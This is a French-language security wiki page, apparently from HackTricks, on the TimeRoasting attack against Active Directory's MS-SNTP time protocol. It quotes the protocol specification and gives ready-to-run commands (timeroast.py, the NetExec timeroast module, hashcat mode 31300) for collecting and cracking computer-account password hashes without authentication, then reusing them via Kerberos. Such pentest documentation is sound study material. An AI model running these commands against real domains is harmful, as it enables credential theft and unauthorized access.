# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting exploite l'extension d'authentification legacy MS-SNTP. Dans MS-SNTP, un client peut envoyer une requête de 68 octets qui intègre le RID de n'importe quel compte ordinateur ; le contrôleur de domaine utilise le hash NTLM (MD4) du compte ordinateur comme clé pour calculer un MAC sur la réponse, puis le renvoie.<sup>[[1]](#references)</sup> Les attaquants peuvent collecter ces MAC MS-SNTP sans authentification et les cracker offline (mode 31300 de Hashcat) afin de récupérer les mots de passe des comptes ordinateurs.<sup>[[2]](#references)</sup>

Consultez les sections 3.1.5.1 « Authentication Request Behavior » et 4 « Protocol Examples » de la spécification officielle MS-SNTP pour plus de détails.<sup>[[1]](#references)</sup>
![TimeRoasting : consultez les sections 3.1.5.1 « Authentication Request Behavior » et 4 « Protocol Examples » de la spécification officielle MS-SNTP pour plus de détails](../../images/Pasted%20image%2020250709114508.png)
Lorsque l'élément ADM ExtendedAuthenticatorSupported est false, le client envoie une requête de 68 octets et intègre le RID dans les 31 bits de poids faible du sous-champ Key Identifier de l'authenticator.<sup>[[1]](#references)</sup>

> Si l'élément ADM ExtendedAuthenticatorSupported est false, le client DOIT construire un message Client NTP Request. La longueur du message Client NTP Request est de 68 octets. Le client définit le champ Authenticator du message Client NTP Request comme décrit dans la section 2.2.1, en écrivant les 31 bits de poids faible de la valeur RID dans les 31 bits de poids faible du sous-champ Key Identifier de l'authenticator, puis en écrivant la valeur Key Selector dans le bit de poids fort du sous-champ Key Identifier.<sup>[[1]](#references)</sup>

Extrait de la section 4 (Protocol Examples) :

> Après avoir reçu la requête, le serveur vérifie que la taille du message reçu est de 68 octets. En supposant que la taille du message reçu est de 68 octets, le serveur extrait le RID du message reçu. Le serveur l'utilise pour appeler la méthode NetrLogonComputeServerDigest (comme indiqué dans la section 3.5.4.8.2 de [MS-NRPC]) afin de calculer les sommes de contrôle cryptographiques et de sélectionner la somme de contrôle cryptographique en fonction du bit de poids fort du sous-champ Key Identifier du message reçu, comme spécifié dans la section 3.2.5. Le serveur envoie ensuite une réponse au client, en définissant le champ Key Identifier sur 0 et le champ Crypto-Checksum sur la somme de contrôle cryptographique calculée.<sup>[[1]](#references)</sup>

La somme de contrôle cryptographique est basée sur MD5 (voir 3.2.5.1.1) et peut être crackée offline, ce qui permet le roasting attack.<sup>[[1]](#references)</sup>

## Comment attaquer

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting par Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Attaque pratique (non authentifiée) avec NetExec + Hashcat

- NetExec peut énumérer et collecter les MACs MS-SNTP pour les RIDs d’ordinateurs sans authentification et afficher des hashages $sntp-ms$ prêts pour le cracking :<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Cracker offline avec le mode 31300 de Hashcat (MS-SNTP MAC) :<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Le texte en clair récupéré correspond au mot de passe d’un compte d’ordinateur. Essayez-le directement en tant que compte de machine avec Kerberos (-k) lorsque NTLM est désactivé :
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Astuces opérationnelles
- Assurez une synchronisation précise de l'heure avant Kerberos : `sudo ntpdate <dc_fqdn>`
- Si nécessaire, générez le fichier krb5.conf pour le realm AD : `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mappez ultérieurement les RID vers les principals via LDAP/BloodHound une fois que vous disposez d'un point d'appui authentifié.

## Références

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
